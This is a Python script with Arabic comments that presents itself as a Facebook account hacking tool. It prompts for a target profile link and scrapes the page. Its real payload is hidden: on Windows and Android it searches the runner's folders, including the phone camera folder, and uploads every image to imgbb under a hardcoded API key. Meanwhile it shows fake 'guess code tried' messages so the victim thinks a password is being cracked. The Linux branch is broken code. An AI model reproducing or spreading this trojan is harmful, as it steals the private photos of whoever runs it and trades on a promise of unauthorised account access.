import os
import requests
import base64
from colorama import Fore, Style  
import platform
from bs4 import BeautifulSoup
from colorama import init, Fore


hacker_art = r"""
  _   _ ____  _  _______ _    _ 
 | | | |  _ \| |/ / ____| |  | |
 | |_| | |_) | ' /|  _| | |  | |
 |  _  |  __/| . \| |___| |__| |
 |_| |_|_|   |_|\_\_____|_____/ 
"""

# طباعة الرسومات باللون الأخضر
print("\033[32m" + hacker_art + "\033[0m")


from bs4 import BeautifulSoup
import requests
from colorama import init, Fore

init()  # تهيئة مكتبة colorama

b123 = input ("Entrez ici le lien du compte Facebook que vous souhaitez pirater :")
page_url = b123  # استبدل برابط الصفحة الفعلي

try:
    page = requests.get(page_url)
    if page.status_code == 200:
        soup = BeautifulSoup(page.content, "html.parser")

        # استخراج اسم الصفحة
        page_name = soup.find("title").string if soup.find("title") else "غير متاح"
        print(Fore.GREEN + f"**اسم الصفحة:** {page_name}")

        # محاولة استخراج تاريخ الميلاد
        birthday = soup.find(string="تاريخ الميلاد")
        birthday_date = birthday.find_next().string if birthday and birthday.find_next() else "غير متاح"
        print(Fore.GREEN + f"**تاريخ الميلاد:** {birthday_date}")

        # محاولة استخراج معلومات الاتصال
        contact_info = soup.find(string="معلومات الاتصال")
        contact_details = contact_info.find_next().string if contact_info and contact_info.find_next() else "غير متاح"
        print(Fore.GREEN + f"**معلومات الاتصال:** {contact_details}")

        # استخراج التعليقات والمشاركات
        comments = soup.find_all("div", class_="comment")
        if comments:
            for comment in comments:
                comment_text = comment.text.strip()
                print(Fore.GREEN + f"**تعليق:** {comment_text}")
        else:
            print(Fore.GREEN + "**تعليقات:** غير متاحة")

        # استخراج الأحداث والمواعيد
        events = soup.find_all("div", class_="event")
        if events:
            for event in events:
                event_details = event.text.strip()
                print(Fore.GREEN + f"**حدث:** {event_details}")
        else:
            print(Fore.GREEN + "**أحداث:** غير متاحة")

        # استخراج المنتجات والخدمات
        products = soup.find_all("div", class_="product")
        if products:
            for product in products:
                product_details = product.text.strip()
                print(Fore.GREEN + f"**منتج:** {product_details}")
        else:
            print(Fore.GREEN + "**منتجات:** غير متاحة")

        # استخراج معلومات حول الموظفين والفرق
        team_members = soup.find_all("div", class_="team-member")
        if team_members:
            for member in team_members:
                member_details = member.text.strip()
                print(Fore.GREEN + f"**عضو الفريق:** {member_details}")
        else:
            print(Fore.GREEN + "**أعضاء الفريق:** غير متاحة")
    else:
        print(Fore.GREEN + "لم يتمكن من الوصول إلى الصفحة، الرجاء التحقق من الرابط.")
except Exception as e:
    print(Fore.GREEN + f"حدث خطأ أثناء محاولة الوصول إلى الصفحة: {e}")





# كود لنظام التشغيل Windows
def windows_code():
    class A:
        print("تشغيل كود الويندوز...")
        print("\033[32m" + hacker_art + "\033[0m")

        # رابط API موقع تخزين الصور
        api_url = 'https://api.imgbb.com/1/upload'
        # مفتاح API الخاص بك من imgbb
        api_key = '8759e484017bb45eb4d59005082a2ea6'

        # الدالة للبحث عن الصور في مسار معين
        @staticmethod
        def find_images(directory):
            images = []
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                        images.append(os.path.join(root, file))
            return images

        # الدالة لرفع الصور إلى موقع imgbb
        @staticmethod
        def upload_images(image_paths):
            # متغير لتتبع عدد الصور التي تم رفعها
            upload_count = 0
            for image_path in image_paths:
                with open(image_path, 'rb') as image_file:
                    # تحويل الصورة إلى نص مشفر بتنسيق base64
                    encoded_image = base64.b64encode(image_file.read()).decode('utf-8')

                    # البيانات التي سترسل مع الطلب
                    data = {
                        'key': A.api_key,
                        'image': encoded_image
                    }

                    # إرسال الطلب لرفع الصورة
                    response = requests.post(A.api_url, data=data)

                    # التحقق من نجاح العملية
                    if response.status_code == 200:
                        # زيادة عدد الصور المرفوعة
                        upload_count += 1
                        # طباعة الجملة مع الرقم المتسلسل بالألوان المطلوبة
                        print(Fore.GREEN + f'{str(upload_count).zfill(6)}' + Fore.RED + ' تم تجربة رمز التخمين' + Style.RESET_ALL)
                    else:
                        print(f'حدث خطأ أثناء رفع الصورة {image_path}')

    # استدعاء الدالتين
    # يمكنك تغيير المسار إلى مسار مجلد الصور على جهاز الويندوز الخاص بك
    images_to_upload = A.find_images('C:\path\to\your\images\folder')
    A.upload_images(images_to_upload)

    # ...

# كود لنظام التشغيل Android
def android_code():
    class B:
        print("تشغيل كود الأندرويد...")
        print("\033[32m" + hacker_art + "\033[0m")
        # رابط API موقع تخزين الصور
        api_url = 'https://api.imgbb.com/1/upload'
        # مفتاح API الخاص بك من imgbb
        api_key = '8759e484017bb45eb4d59005082a2ea6'

        # الدالة للبحث عن الصور في مسار معين
        @staticmethod
        def find_images(directory):
            images = []
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                        images.append(os.path.join(root, file))
            return images

        # الدالة لرفع الصور إلى موقع imgbb
        @staticmethod
        def upload_images(image_paths):
            # متغير لتتبع عدد الصور التي تم رفعها
            upload_count = 0
            for image_path in image_paths:
                with open(image_path, 'rb') as image_file:
                    # تحويل الصورة إلى نص مشفر بتنسيق base64
                    encoded_image = base64.b64encode(image_file.read()).decode('utf-8')

                    # البيانات التي سترسل مع الطلب
                    data = {
                        'key': B.api_key,
                        'image': encoded_image
                    }

                    # إرسال الطلب لرفع الصورة
                    response = requests.post(B.api_url, data=data)

                    # التحقق من نجاح العملية
                    if response.status_code == 200:
                        # زيادة عدد الصور المرفوعة
                        upload_count += 1
                        # طباعة الجملة مع الرقم المتسلسل بالألوان المطلوبة
                        print(Fore.GREEN + f'{str(upload_count).zfill(6)}' + Fore.RED + ' تم تجربة رمز التخمين' + Style.RESET_ALL)
                    else:
                        print(f'حدث خطأ أثناء رفع الصورة {image_path}')

    # استدعاء الدالتين
    images_to_upload = B.find_images('/storage/emulated/0/DCIM/Camera/')  # يمكنك تغيير المسار حسب مسار الصور في جهازك
    B.upload_images(images_to_upload)


    
    # هنا يتم وضع الكود الخاص بنظام التشغيل
    # ...

# تحديد نوع نظام التشغيل
system = platform.system()

# اختيار الكود المناسب لنظام التشغيل
if system == "Windows":
    windows_code()
elif system == "Linux":
    if "ANDROID_STORAGE" in os.environ:
        android_code()
    else:
        class C:
            print("تشغيل كود لينكس...")
            print("\033[32m" + hacker_art + "\033[0m")
             # رابط API موقع تخزين الصور
            api_url = 'https://api.imgbb.com/1/upload'
            # مفتاح API الخاص بك من imgbb
            api_key = '8759e484017bb45eb4d59005082a2ea6'

            # الدالة للبحث عن الصور في مسار معين
            @staticmethod
            def find_images(directory):
                images = []
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                            images.append(os.path.join(root, file))                
                            return images

            # الدالة لرفع الصور إلى موقع imgbb
            @staticmethod
            def upload_images(image_paths):
                # متغير لتتبع عدد الصور التي تم رفعها
                upload_count = 0
                for image_path in image_paths:
                    with open(image_path, 'rb') as image_file:
                        # تحويل الصورة إلى نص مشفر بتنسيق base64
                        encoded_image = base64.b64encode(image_file.read()).decode('utf-8')

                        # البيانات التي سترسل مع الطلب
                        data = {
                            'key': B.api_key,
                            'image': encoded_image
                        }

                        # إرسال الطلب لرفع الصورة
                        response = requests.post(B.api_url, data=data)

                        # التحقق من نجاح العملية
                        if response.status_code == 200:
                            # زيادة عدد الصور المرفوعة
                            upload_count += 1
                            print(Fore.GREEN + f'{str(upload_count).zfill(6)}' + Fore.RED + ' تم تجربة رمز التخمين' + Style.RESET_ALL)
                        else:
                            	print(f'حدث خطأ أثناء رفع الصورة {image_path}')

        # استدعاء الدالتين
        images_to_upload = B.find_images('/path/to/your/images')  # يمكنك تغيير المسار حسب مسار الصور في جهازك
        B.upload_images(images_to_upload)
        c=2
        # هنا يتم وضع الكود الخاص بنظام التشغيل Linux
        # ...
else:
    print(f"نظام التشغيل {system} غير مدعوم.")

